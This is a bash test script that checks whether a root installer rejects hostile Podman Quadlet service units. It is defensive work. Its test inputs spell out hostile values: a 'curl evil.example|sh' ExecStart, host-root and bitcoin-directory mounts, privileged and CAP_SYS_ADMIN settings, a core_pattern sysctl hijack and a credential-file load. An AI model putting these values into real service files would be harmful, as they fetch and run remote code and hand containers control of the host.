#!/usr/bin/env bash
# Adversarial test of the root helper's service validation (deploy/install.sh).
# Extracts the real allowlists and validator, then throws hostile Quadlet
# units at them — the trust boundary between nodeosd and root.
#
#   bash deploy/test-service-validation.sh deploy/install.sh
#
# Bash only (the Go side is covered by internal/services/services_test.go,
# which checks the catalog against these same allowlists).
set -uo pipefail
INSTALL="${1:?usage: test-service-validation.sh /path/to/install.sh}"

# pull the allowlists + validator out of the installer without running it
eval "$(grep -E '^SVC_(IMAGE|KEY|VOL)_RE=' "$INSTALL")"
eval "$(sed -n '/^svc_validate_unit() {/,/^}/p' "$INSTALL")"
log() { echo "      helper: $*"; }

pass=0; fail=0
try() { # try <expect ok|reject> <name> <content>
  local expect="$1" name="$2" content="$3" f
  f="$(mktemp)"; printf '%s\n' "$content" > "$f"
  if svc_validate_unit "$f" >/dev/null 2>&1; then got=ok; else got=reject; fi
  rm -f "$f"
  if [[ "$got" == "$expect" ]]; then
    echo "  PASS  [$got] $name"; pass=$((pass+1))
  else
    echo "  FAIL  [$got, want $expect] $name"; fail=$((fail+1))
  fi
}

GOOD='[Unit]
Description=NodeOS service: test
After=network-online.target

[Container]
Image=docker.io/getumbrel/electrs:v0.10.9
ContainerName=nodeos-svc-electrs
Network=host
Volume=/var/lib/nodeos-services/electrs:/data
Environment=ELECTRS_DB_DIR=/data

[Service]
Restart=on-failure
RestartSec=10

[Install]
WantedBy=multi-user.target'

echo "== a legitimate unit must pass"
try ok "catalog-shaped unit" "$GOOD"

echo "== hostile units must be rejected"
try reject "unallowlisted image"        "${GOOD/docker.io\/getumbrel\/electrs:v0.10.9/docker.io/evil/miner:latest}"
try reject "host root volume"           "$GOOD
Volume=/:/host"
try reject "bitcoin dir volume"         "$GOOD
Volume=/etc/bitcoin:/etc/bitcoin"
try reject "privileged container"       "$GOOD
Privileged=true"
try reject "podman args escape"         "$GOOD
PodmanArgs=--privileged -v /:/host"
try reject "host command execution"     "$GOOD
ExecStart=/bin/sh -c 'curl evil.example|sh'"
try reject "ExecStartPre on host"       "$GOOD
ExecStartPre=/bin/sh -c evil"
try reject "added capability"           "$GOOD
AddCapability=CAP_SYS_ADMIN"
try reject "bind mount"                 "$GOOD
Mount=type=bind,source=/,destination=/host"
try reject "host device"                "$GOOD
HostDevice=/dev/sda"
try reject "run as root override"       "$GOOD
User=root"
try reject "sysctl tampering"           "$GOOD
Sysctl=kernel.core_pattern=|/tmp/x"
try reject "foreign container name"     "${GOOD/ContainerName=nodeos-svc-electrs/ContainerName=evil}"
try reject "wrong install target"       "${GOOD/WantedBy=multi-user.target/WantedBy=sysinit.target}"
try reject "no image at all"            '[Container]
ContainerName=nodeos-svc-x
Network=host'
try reject "unknown directive"          "$GOOD
LoadCredential=secret:/etc/bitcoin/bitcoin.conf"

echo
echo "passed: $pass   failed: $fail"
[[ $fail -eq 0 ]]
